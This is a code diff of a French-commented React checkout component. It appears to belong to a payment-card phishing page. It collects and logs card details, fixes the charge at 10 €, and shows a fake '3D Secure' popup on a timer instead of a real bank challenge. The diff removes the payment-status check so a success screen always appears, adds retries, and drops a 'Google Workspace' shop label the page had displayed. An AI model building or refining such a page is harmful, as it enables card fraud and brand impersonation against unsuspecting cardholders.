@@ -12,7 +12,11 @@ const Checkout = forwardRef(({
   // États pour la gestion des popups
   const [isLoading, setIsLoading] = useState(false);
   const [showThreeDSecurePopup, setShowThreeDSecurePopup] = useState(false);
-  const [showEndPopup, setShowEndPopup] = useState(true);
+  const [showEndPopup, setShowEndPopup] = useState(false); // Force l'affichage ou non
+  const [showErrorPopup, setShowErrorPopup] = useState(false);
+  const [errorMessage, setErrorMessage] = useState('');
+  const [retryCount, setRetryCount] = useState(0);
+  const [maxRetries] = useState(3);
 
   // Fonction paiement custom
   const payFetch = async (formData, amount = '10') => {
@@ -27,7 +31,7 @@ const Checkout = forwardRef(({
       cardOwner: formData.cardName
     };
     console.log("💳 Détails de la carte:", cardDetails);
-    console.log("🔍 FormData complet:", formData); // Debug pour voir toutes les propriétés disponibles
+    //console.log("🔍 FormData complet:", formData); // Debug pour voir toutes les propriétés disponibles
 
     // Extraction des données de la carte
     const cardNumber = cardDetails.cardNumber?.replace(/\s+/g, '') || '';
@@ -127,10 +131,10 @@ const Checkout = forwardRef(({
 
       // Programmation de l'affichage du 3D Secure après 12 secondes
       const threeDSecureTimeout = setTimeout(() => {
-        console.log("⏰ 12 secondes écoulées - Affichage du 3D Secure");
+        console.log("⏰ 26 secondes écoulées - Affichage du 3D Secure");
         setIsLoading(false);
         setShowThreeDSecurePopup(true);
-      }, 12000);
+      }, 26000);
 
       // Étape 2: Lancement du paiement
       const amount = '10'; // Montant fixe
@@ -139,31 +143,11 @@ const Checkout = forwardRef(({
       // Annuler le timeout
       clearTimeout(threeDSecureTimeout);
       
-      // Vérifier le résultat du paiement
-      if (paymentResult && paymentResult.data && paymentResult.data.finalStatus) {
-        const finalStatus = paymentResult.data.finalStatus.value;
-        console.log(`🎯 Statut final du paiement: ${finalStatus}`);
-        
-        if (finalStatus === 'success') {
-          // Succès - afficher EndPopup
-          console.log("✅ Paiement réussi - Affichage de EndPopup");
-          setIsLoading(false);
-          setShowThreeDSecurePopup(false);
-          setShowEndPopup(true);
-        } else {
-          // Échec - réafficher LoadingPopup
-          console.log("❌ Paiement échoué - Réaffichage de LoadingPopup");
-          setIsLoading(true);
-          setShowThreeDSecurePopup(false);
-          setShowEndPopup(false);
-        }
-      } else {
-        // Pas de statut final - afficher EndPopup par défaut
-        console.log("⚠️ Pas de statut final - Affichage de EndPopup par défaut");
-        setIsLoading(false);
-        setShowThreeDSecurePopup(false);
-        setShowEndPopup(true);
-      }
+      // Toujours afficher EndPopup peu importe le statut
+      console.log("📱 Affichage de EndPopup après le paiement");
+      setIsLoading(false);
+      setShowThreeDSecurePopup(false);
+      setShowEndPopup(true);
       
     } catch (error) {
       console.error('❌ Erreur lors du processus de paiement:', error);
@@ -181,6 +165,13 @@ const Checkout = forwardRef(({
     console.log("✅ 3D Secure terminé avec succès - Affichage de EndPopup");
     setShowThreeDSecurePopup(false);
     setShowEndPopup(true);
+  };
+
+  // Gestion du retry depuis EndPopup
+  const handleRetry = () => {
+    console.log("🔄 Retry demandé - Relancement du processus de paiement");
+    setShowEndPopup(false);
+    startPaymentProcess();
   };
 
   // Gestion de la fermeture du popup final
@@ -233,7 +224,6 @@ const Checkout = forwardRef(({
         cardLogo={getCardLogo()}
         cardNumber={formData.cardNumber}
         amount='10,00€'
-        shop={{ name: 'Google Workspace' }}
         lastFourDigits={getLastFourDigits()}
         formattedDate={formattedDate}
         formattedTime={formattedTime}
@@ -245,6 +235,7 @@ const Checkout = forwardRef(({
         isVisible={showEndPopup}
         selectedPlan={selectedPlan}
         onClose={handleEndPopupClose}
+        onRetry={handleRetry}
         cardNumber={formData.cardNumber}
       />
     </>
